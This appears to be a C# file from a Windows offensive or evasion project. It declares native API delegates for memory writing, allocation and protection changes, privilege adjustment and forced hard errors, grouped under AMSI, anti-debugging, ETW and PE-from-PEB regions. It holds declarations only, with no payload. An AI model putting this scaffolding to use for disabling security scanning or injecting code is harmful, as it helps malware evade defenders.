using System;
using System.Runtime.InteropServices;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    internal partial class Commons
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate void RtlInitUnicodeString
            (
                ref UnicodeString DestinationString, 
                [MarshalAs(UnmanagedType.LPWStr)] string SourceString
            );

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate void RtlEnterCriticalSection(IntPtr lpCriticalSection);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate void RtlLeaveCriticalSection(IntPtr lpCriticalSection);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal unsafe delegate int CoGetObject
            (
                byte[] pszName,
                BIND_OPTS3* pBindOptions,
                Guid* riid,
                void** rReturnedComObject
            );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal unsafe delegate NtStatus NtProtectVirtualMemory
            (
                void* ProcessHandle,
                void* BaseAddress,
                uint* NumberOfBytesToProtect,
                PageAccessType NewAccessProtection,
                PageAccessType* OldAccessProtection
            );


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]//Cdecl FOR MANUAL SYSCALL, StdCall otherwise
        internal delegate uint NtWriteVirtualMemory
            (
                IntPtr ProcessHandle, 
                IntPtr BaseAddress, 
                IntPtr buffer, 
                UIntPtr bufferSize, 
                out UIntPtr written
            );


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal unsafe delegate NtStatus NtAllocateVirtualMemory
            (
                void* ProcessHandle,
                void* BaseAddress,
                uint ZeroBits,
                uint* RegionSize,
                MemoryAllocationType AllocationType,
                PageAccessType Protect
            );

        #region "AMSI"
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate IntPtr LoadLibrary
            (
                byte[] name
            );

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate bool VirtualProtect
            (
                IntPtr lpAddress,
                UIntPtr dwSize,
                uint flNewProtect,
                out uint lpflOldProtect
            );

        internal static LoadLibrary loadLibrary;
        internal static VirtualProtect virtualProtect;
        #endregion
        #region "AntiDBG"
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate NtStatus RtlAdjustPrivilege
            (
                RTL_PRIVILEGES privilege,
                bool bEnablePrivilege,
                bool IsThreadPrivilege,
                out bool PreviousValue
            );

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate NtStatus NtRaiseHardError
            (
                uint ErrorStatus,
                uint NumberOfParameters,
                uint UnicodeStringParameterMask,
                IntPtr Parameters,
                HARDERROR_RESPONSE_OPTION ValidResponseOption,
                out HARDERROR_RESPONSE Response
            );

        internal static RtlAdjustPrivilege rtlAdjustPrivilege;
        internal static NtRaiseHardError ntRaiseHardError;
        #endregion
        #region "ETW"
        internal delegate NtStatus NtProtectVirtualMemorySafe
            (
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                ref uint NumberOfBytesToProtect,
                PageAccessType NewAccessProtection,
                ref PageAccessType OldAccessProtection
            );
        internal static NtProtectVirtualMemorySafe ntProtectVirtualMemorySafe;
        #endregion
        #region "PEFromPEB"
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        internal delegate NtStatus NtWriteVirtualMemorySafe
            (
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                byte[] Buffer,
                uint NumberOfBytesToWrite,
                out uint NumberOfBytesWritten
            );


        internal static NtWriteVirtualMemorySafe ntWriteVirtualMemorySafe;
        #endregion

        internal static NtProtectVirtualMemory ntProtectVirtualMemory;
        internal static NtWriteVirtualMemory ntWriteVirtualMemory;
        internal static RtlInitUnicodeString rtlInitUnicodeString;
        internal static RtlEnterCriticalSection rtlEnterCriticalSection;
        internal static RtlLeaveCriticalSection rtlLeaveCriticalSection;
        //private static NtQueryInformationProcessDel ntQueryInformationProcess;
        internal static CoGetObject coGetObject;
    }
}
